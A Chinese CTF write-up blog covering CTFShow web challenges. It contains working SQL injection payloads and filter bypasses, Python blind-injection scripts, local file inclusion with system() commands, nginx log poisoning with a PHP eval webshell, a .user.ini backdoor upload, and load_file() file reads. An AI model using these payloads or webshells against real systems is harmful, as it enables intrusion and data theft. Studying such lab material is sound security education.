---
title: CTFShow WEB-WP（持续更新）
date: 2020-10-13 17:32:00
categories: CTF做题记录
---
>本文仅为做题记录，可能不够详细，不懂的命令建议百度查询

<!-- TOC -->

- [web签到题](#web签到题)
- [web2](#web2)
- [web3](#web3)
- [web4](#web4)
- [web5](#web5)
- [web6](#web6)
- [web7](#web7)
- [web8](#web8)
- [web9](#web9)
- [web10](#web10)
- [web11](#web11)
- [web12](#web12)
- [web13](#web13)
- [web14](#web14)
- [CTFshow web1](#ctfshow-web1)

<!-- /TOC -->
<!--more-->
# web签到题
没啥说的，源码base64解密

---
# web2
>简单sql

万能密码登陆，`username=admin' or(1)#&password=admin`，没啥东西，union联合查询，发现回显在第二个
![union](https://raw.githubusercontent.com/yq1ng/blog/master/CTFShow/image.08jzott3rx95.png)
查表：`username=admin' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()#&password=admin`\
查列：`username=admin' union select 1,group_concat(column_name),3 from information_schema.columns where table_name='flag'#&password=admin`\
查字段：`username=admin' union select 1,group_concat(flag),3 from flag#&password=admin`
以上可以理解为固定用法

---
# web3
>LFI[不错的文章](https://www.freebuf.com/articles/web/182280.html)

给了源码` <?php include($_GET['url']);?> `，这题我用了伪协议，通过`php://input`来执行命令或者写入木马\
`GET：http://6a859db9-97c1-4261-b3c9-5b234c4a9c2b.chall.ctf.show/?url=php://input`，`POST：<?php system('ls');?>`
![ls](https://raw.githubusercontent.com/yq1ng/blog/master/CTFShow/image.4rtzgtm95op.png)
`GET：http://6a859db9-97c1-4261-b3c9-5b234c4a9c2b.chall.ctf.show/?url=php://input`，`POST：<?php system('cat ctf_go_go_go');?>`
![flag](https://raw.githubusercontent.com/yq1ng/blog/master/CTFShow/image.hm3ykdje0p7.png)

---
# web4
>nginx日志注入，LFI（local File Include）

这题再用上面的就不行了，应该是php伪协议被ban了，但是还能包含`/etc/passwd`，抓包可以知道服务器是nginx，其默认日志路径在`/var/log/nginx/access.log`和`/var/log/nginx/error.log`，其中access可以包含成功，抓包直接在`User-Agent`输入一句话木马：`<?php @eval($_POST['yq1ng']);?>`，此请求头用来标识客户端用的什么浏览器进行访问的
![yq1ng](https://raw.githubusercontent.com/yq1ng/blog/master/CTFShow/image.we8vhqra5r.png)
![AntSword](https://raw.githubusercontent.com/yq1ng/blog/master/CTFShow/image.g6wz0avu9kn.png)
flag在`/var/www/flag.txt`

---
# web5
>md5碰撞\
`ctype_alpha()` --> 做纯字符检测

开箱送源码
```php
<?php
$flag="";
$v1=$_GET['v1'];
$v2=$_GET['v2'];
if(isset($v1) && isset($v2)){
    if(!ctype_alpha($v1)){
        die("v1 error");
    }
    if(!is_numeric($v2)){
        die("v2 error");
    }
    if(md5($v1)==md5($v2)){
        echo $flag;
    }
}else{
    echo "where is flag?";
}
?>
```
>介绍一个函数`ctype_alpha`\
用法：ctype_alpha ( string $text ) : bool\
用途：做纯字符检测\
返回值：如果在当前语言环境中 text 里的每个字符都是一个字母，那么就返回TRUE，反之则返回FALSE

可以做md5碰撞，[CTF中常见php-MD5()函数漏洞](https://blog.csdn.net/qq_19980431/article/details/83018232)
payload：`?v1=QNKCDZO&v2=240610708`

---
# web6
>空格绕过

与web2不同，本题含waf，先试了万能密码`username=admin' or(1)#&password=admin`，回显：   sql inject error\
逐个删除万能密码字符，发现过滤的是空格，这好说，空格一般可以由`/**/`,`回车(%0a)`,\`,`tab`绕过，一般我用`/**/`，注入语句和web2一样，只是把空格替换了\
爆库：`username=admin%27/**/union/**/select/**/1,database(),3#&password=a`(回显web2，一样的数据库-.-)\
爆表：`username=admin%27/**/union/**/select/**/1,group_concat(table_name),3/**/from/**/information_schema.tables/**/where/**/table_schema=database()#&password=a`(flag,user)\
爆列：`username=admin'/**/union/**/select/**/1,group_concat(column_name),3/**/from/**/information_schema.columns/**/where/**/table_name='flag'#&password=a`(flag)\
爆字：`username=admin'/**/union/**/select/**/1,group_concat(flag),3/**/from/**/flag#&password=a`

---
# web7
>过滤空格的脚本编写

随便进一个链接，发现URL可能有LFI，并不是，可能还是注入？单引号没用，试试整形注入，`?id=1/**/or(1)`，文章全出来了，就是这个了；不过联合查询没用，可以试试ascii，payload：`?id=-1/**/or/**/ascii(substr(database(),1,1))=119`，有回显说明当前字符为119即'w'，上脚本，只爆了表名
```python
import requests

url = 'http://b546d8a3-ca61-40c8-9af7-ba1bad1fc81b.chall.ctf.show/index.php?id=-1/**/'
db_length = 0
db_name = ''
tb_num = 0
tb_length = 0
tb_name = ''
tb_list = []

#db_length
print("Judging the length of the database name...")
for x in range(1,50):
	payload = 'or(if(length(database())=%d,1,0))'% x
	#print(url+payload)
	r = requests.get(url + payload)
	print("\r[+]The database name length is %d"% x,end = '')
	if "By Rudyard Kipling" in r.text:
		db_length = x
		break

#db_name
print("\nGetting the database name...")
for x in range(1,db_length+2):
	for y in range(33,128):
		payload = "or(if(ascii(substr((select/**/database()),%d,1))=%d,1,0))"% (x,y)
		#print(url + payload)
		r = requests.get(url + payload)
		print("\r[+]The database name is %s"% db_name,end = '')
		if "By Rudyard Kipling" in r.text:
			db_name += chr(y)
			break

#table_num
print("\nJudging the number of tables in the database...")
for x in range(1,100):
	#payload = "and if(((select count(*) from information_schema.tables where table_schema='%s')=%d),1,0)--+"% (db_name,x)
	payload = "or(if(((select/**/count(*)/**/from/**/information_schema.tables/**/where/**/table_schema=database())=%d),1,0))"% x
	#print(payload)
	r = requests.get(url+payload)
	print("\r[+]There are %d tables in this database"% x,end = '')
	if "By Rudyard Kipling" in r.text:
		tb_num = x
		break

#table_name
print("\nGetting the table name...")
for x in range(0,tb_num):
	tb_name = ''
	#table_length
	for y in range(1,21):
		payload = "or((select/**/length(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=database()/**/limit/**/%d,1)=%d)"% (x,y)
		r = requests.get(url + payload)
		#print(url + payload)
		if "By Rudyard Kipling" in r.text:
			tb_length = y
			#print(tb_length)
			#table_name
			for z in range(1,tb_length+1):
				for i in range(33,128):
					payload = "or(ascii(substr((select/**/table_name/**/from/**/information_schema.tables/**/where/**/table_schema=database()/**/limit/**/%d,1),%d,1))=%d)"% (x,z,i)
					r = requests.get(url + payload)
					#print(url + payload)
					if "By Rudyard Kipling" in r.text:
						tb_name += chr(i)
						break
			print("[+]" + tb_name)
			tb_list.append(tb_name)
			break
print("The table names in this database are：",tb_list)
```
![table_name](https://raw.githubusercontent.com/yq1ng/blog/master/SQLi-labs/image.gzday4xcdgq.png)
爆列名，出了flag
```python
import requests

url = 'http://7832a75d-de26-4403-8795-0153f595dd59.chall.ctf.show/index.php?id=-1/**/'
column_num = 0
column_length = 0
column_name = ''
column_list = []

#column_num
print("Judging the number of columns in the table...")
for x in range(1,51):
	payload = 'or((select/**/count(column_name)/**/from/**/information_schema.columns/**/where/**/table_name="flag")=%d)'% x
	r = requests.get(url + payload)
	#print(url + payload)
	if "By Rudyard Kipling" in r.text:
		column_num = x
		print(("[+] table %-8s\t" % x) + 'of   ' + str(column_num) + '   columns')
		break

#column_name
print('column names in the flag table：')
for x in range(0,column_num):
	column_name = ''
	for y in range(1,99):
		payload = 'or((select/**/length(column_name)/**/from/**/information_schema.columns/**/where/**/table_name="flag"/**/limit/**/%d,1)=%d)'% (x,y)
		r = requests.get(url + payload)
		if "By Rudyard Kipling" in r.text:
			column_length = y
			#column_name
			for z in range(1,column_length+1):
				for i in range(33,128):
					payload = 'or(ascii(substr((select/**/column_name/**/from/**/information_schema.columns/**/where/**/table_name="flag"/**/limit/**/%d,1),%d,1))=%d)'% (x,z,i)
					#print(payload)
					r = requests.get(url + payload)
					if "By Rudyard Kipling" in r.text:
						column_name += chr(i)
						break
			print("[+]"+column_name)
			column_list.append(column_name)
			break
print("columns is ：",column_list)
```
![column_name](https://raw.githubusercontent.com/yq1ng/blog/master/CTFShow/image.zk8ka2zwak.png)
查字段
```python
import requests

url = 'http://7832a75d-de26-4403-8795-0153f595dd59.chall.ctf.show/index.php?id=-1/**/'
field_num = 0
field_value = ''

#field_num
for x in range(1,999):#不知道有多少条字段，尽量大
	payload = 'or(if((select/**/count(*)/**/from/**/flag)=%d,1,0))'% (x)
	#print(payload)
	r = requests.get(url + payload)
	if "By Rudyard Kipling" in r.text:
		field_num = x
		break
print("There are %d values ​​in the flag table"% (field_num))


#field_value
print("The value of flag is")
for x in range(0, field_num):
	field_value = ''
	for y in range(1, 999):
		for z in range(33,128):
			payload = 'or(ascii(substr((select/**/flag/**/from/**/flag/**/limit/**/%d,1),%d,1))=%d)'% (x ,y ,z)
			#print(payload)
			r = requests.get(url + payload)
			if "By Rudyard Kipling" in r.text:
				field_value += chr(z)
				break
		if z == 127:
			break
	print("[+]" + field_value)
```
![flag](https://raw.githubusercontent.com/yq1ng/blog/master/CTFShow/image.wbekykl2li.png)
太菜了，脚本很zz

---
# web8
>过滤空格，逗号

fuzz发现过滤了`,`逗号，那么`limit 0,1`改为`limit 1 offset 0`，`substr(string,1,1)`改为`substr(string from 1 for 1)`，简单改改脚本即可
```python
import requests

url = 'http://4b165f8e-f06a-4d9e-a99f-af1a91461c6e.chall.ctf.show/index.php?id=-1/**/'
field_num = 0
field_value = ''

#field_num
for x in range(1,999):#不知道有多少条字段，尽量大
	payload = 'or((select/**/count(*)/**/from/**/flag)=%d)'% (x)
	#print(payload)
	r = requests.get(url + payload)
	if "By Rudyard Kipling" in r.text:
		field_num = x
		break
print("There are %d values ​​in the flag table"% (field_num))


#field_value
print("The value of flag is")
for x in range(0, field_num):
	field_value = ''
	for y in range(1, 999):
		for z in range(33,128):
			payload = 'or(ascii(substr((select/**/flag/**/from/**/flag/**/limit/**/1/**/offset/**/%d)from/**/%d/**/for/**/1))=%d)'% (x ,y ,z)
			#print(payload)
			r = requests.get(url + payload)
			if "By Rudyard Kipling" in r.text:
				field_value += chr(z)
				break
		if z == 127:
			break
	print("[+]" + field_value)
```

---
# web9
>md5(str,true)的绕过

登陆界面，万能密码莫得用啊！源码也没东西，扫目录出来一个`index.phps`，这种题的常用密码`ffifdyop`，原理移步[BJDCTF2020-Easy MD5](https://yq1ng.github.io/z_post/BJDCTF2020%E5%85%A8%E5%AE%B6%E6%A1%B6/#bjdctf2020easy-md5)
```php
<?php
$flag="";
$password=$_POST['password'];
if(strlen($password)>10){
    die("password error");
}
$sql="select * from user where username ='admin' and password ='".md5($password,true)."'";
$result=mysqli_query($con,$sql);
    if(mysqli_num_rows($result)>0){
            while($row=mysqli_fetch_assoc($result)){
                    echo "登陆成功<br>";
                    echo $flag;
                }
    }
?>
```

---
# web10
>虚拟表的绕过--with rollup

和上题一样
```php
<?php
$flag="";
function replaceSpecialChar($strParam){
     $regex = "/(select|from|where|join|sleep|and|\s|union|,)/i";
     return preg_replace($regex,"",$strParam);
}
if (!$con)
{
    die('Could not connect: ' . mysqli_error());
}
if(strlen($username)!=strlen(replaceSpecialChar($username))){
	die("sql inject error");
}
if(strlen($password)!=strlen(replaceSpecialChar($password))){
	die("sql inject error");
}
$sql="select * from user where username = '$username'";
$result=mysqli_query($con,$sql);
	if(mysqli_num_rows($result)>0){
			while($row=mysqli_fetch_assoc($result)){
				if($password==$row['password']){
					echo "登陆成功<br>";
					echo $flag;
				}

			 }
	}
?>
```
查询函数都被ban了，其实正则双写就能绕过，但是`if(strlen($username)!=strlen(replaceSpecialChar($username)))`来作祟，不能双写了，来看两个MySQL语句

- `group by` 分组语句,将结果集中的数据行根据选择列的值进行逻辑分组
- `with rollup` 在分组统计数据的基础上再进行统计汇总，即用来得到group by的汇总信息

![with_rollup](https://raw.githubusercontent.com/yq1ng/blog/master/SQLi-labs/image.42y86t0k5x1.png)
payload：`username=admin'/**/or/**/1=1/**/group/**/by/**/password/**/with/**/rollup#&password=`
pass的判断进行了while，所以不用担心NULL在第几条

---
# web11
>session

```php
<?php
function replaceSpecialChar($strParam){
        $regex = "/(select|from|where|join|sleep|and|\s|union|,)/i";
        return preg_replace($regex,"",$strParam);
}
if(strlen($password)!=strlen(replaceSpecialChar($password))){
    die("sql inject error");
}
if($password==$_SESSION['password']){
    echo $flag;
}else{
    echo "error";
}
?>
```
删除本地session在进行空密码登陆即可

---
# web12
>glob()返回指定文件名/目录

网页源码提示`<!-- hit:?cmd= -->`，一开始以为RCE，结果不是，试试`?cmd=phpinfo();`，输出了phpinfo()，猜测源码中有`eval($_GET('cmd'));`，用`?cmd=show_source('index.php');`读读源码
```php
<?php
$cmd=$_GET['cmd'];
eval($cmd);
?>
```
看了hint，还有个`glob()`，这个函数是返回匹配指定模式的文件名或目录。读一下所有文件，得到两个文件，再用读源码的套路读一下另外一个就出flag了
>补充：三种读源码函数：\
- `readfile()`
- `show_source()`
- `highlight_file()`

---
# web13
>.user.ini构成的php后门

上传所有文件都是`error file zise`，╮(╯▽╰)╭扫！

```php
//upload.php.bak
<?php 
	header("content-type:text/html;charset=utf-8");
	$filename = $_FILES['file']['name'];
	$temp_name = $_FILES['file']['tmp_name'];
	$size = $_FILES['file']['size'];
	$error = $_FILES['file']['error'];
	$arr = pathinfo($filename);
	$ext_suffix = $arr['extension'];
	if ($size > 24){
		die("error file zise");
	}
	if (strlen($filename)>9){
		die("error file name");
	}
	if(strlen($ext_suffix)>3){
		die("error suffix");
	}
	if(preg_match("/php/i",$ext_suffix)){
		die("error suffix");
    }
    if(preg_match("/php/i"),$filename)){
        die("error file name");
    }
	if (move_uploaded_file($temp_name, './'.$filename)){
		echo "文件上传成功！";
	}else{
		echo "文件上传失败！";
	}

 ?>
```

从源码得知

- 文件大小不能大于24
- 上传文件名不能大于9
- 文件名后缀不能大于3
- 文件名和后缀都不能包含php
  
上传一句话`<?php eval($_POST[1]);`，正好24字节，文件名为`a.jpg`
  
然后再介绍一个比`.htaccess`还厉害的解析文件`.user.ini`\
php除了主 php.ini 之外，PHP 还会在每个目录下扫描 INI 文件，从被执行的 PHP 文件所在目录开始一直上升到 web 根目录（$_SERVER['DOCUMENT_ROOT'] 所指定的）。如果被执行的 PHP 文件在 web 根目录之外，则只扫描该目录，如果在.user.ini中如果设置了文件名，那么任意一个页面都会将该文件中的内容包含进去\
在`.user.ini`中写上`auto_prepend_file=a.jpg`,传上去\
都上传完了，想用antsword连马儿发现连不上对不对，[官方文档](https://www.php.net/manual/zh/configuration.file.per-user.php)说`user_ini.cache_ttl`控制着重新读取用户 INI 文件的间隔时间。默认是 300 秒（5 分钟），所以等会吧\
连上以后别用图形化查看文件，没权限，用虚拟终端，一查一个准
![flag](https://raw.githubusercontent.com/yq1ng/blog/master/CTFShow/image.6hf3mw2xxqx.png)

---
# web14
>MySQL反引号绕过简单过滤，MySQL的`load_file()`函数读取本地文件

开箱送源码
```php
 <?php
include("secret.php");

if(isset($_GET['c'])){
    $c = intval($_GET['c']);
    sleep($c);
    switch ($c) {
        case 1:
            echo '$url';
            break;
        case 2:
            echo '@A@';
            break;
        case 555555:
            echo $url;
        case 44444:
            echo "@A@";
            break;
        case 3333:
            echo $url;
            break;
        case 222:
            echo '@A@';
            break;
        case 222:
            echo '@A@';
            break;
        case 3333:
            echo $url;
            break;
        case 44444:
            echo '@A@';
        case 555555:
            echo $url;
            break;
        case 3:
            echo '@A@';
        case 6000000:
            echo "$url";
        case 1:
            echo '@A@';
            break;
    }
}

highlight_file(__FILE__); 
```
因为中间有`sleep()`函数，所以c要尽可能的小，`c=3`就挺好，还没有break，直接把下面的语句也运行了，然后给了个页面`here_1s_your_f1ag.php`\
这种查询页面一看就是sql，`/here_1s_your_f1ag.php?query=1`，页面源码给了waf

```php
if(preg_match('/information_schema\.tables|information_schema\.columns|linestring| |polygon/is', $_GET['query'])){
		die('@A@');
    }
```
试了一回，字段都查不出来，fuzz了一下发现空格又被过滤了。。。`?query=-1/**/or(1)`回显正常，`order/**/by`查出来1个字段，过滤不严，可以用MySQL的\`反引号去绕过\
爆表：``?query=-1/**/union/**/select/**/group_concat(table_name)/**/from/**/information_schema.`tables`/**/where/**/table_schema=database()``\
爆字段：``?query=-1/**/union/**/select/**/group_concat(column_name)/**/from/**/information_schema.`columns`/**/where/**/table_name='content'``\
爆值：`?query=-1/**/union/**/select/**/group_concat(id,":",username,":",password)/**/from/**/content`\
回显`1:admin:flag is not here!,2:gtf1y:wow,you can really dance,3:Wow:tell you a secret,secret has a secret...`\
提示看看secret，MySQL的`load_file()`函数可以读取本地文件，payload：`?query=-1/**/union/**/select/**/load_file('/var/www/html/secret.php')`
```php
<?php
$url = 'here_1s_your_f1ag.php';
$file = '/tmp/gtf1y';
if(trim(@file_get_contents($file)) === 'ctf.show'{
	echo file_get_contents('/real_flag_is_here');
}
```
最终payload：`?query=-1/**/union/**/select/**/load_file('/real_flag_is_here')`

---
# CTFshow web1

随便注册一个账号登进去，URL有`?order=id`，注入没反应，看变量名是排序，然后就把url改为`?order=email`发现回显按email列排序了，猜测sql为`select * from users order by "$_GET('order')"`，这个时候需要一个骚姿势了，可以看看我的这个文章：[[GYCTF2020]Ezsqli](https://yq1ng.github.io/z_post/GYCTF2020%E9%83%A8%E5%88%86WEB/#gyctf2020ezsqli)，MySQL查询的按位比较，那就在猜一下password在数据库的字段名，常见的有password，passwd，pwd，试出来是`?order=pwd`，回显发生变化，我注册的账号密码都是`a`，结果此账号排在了第一位，要写脚本，先搁置了
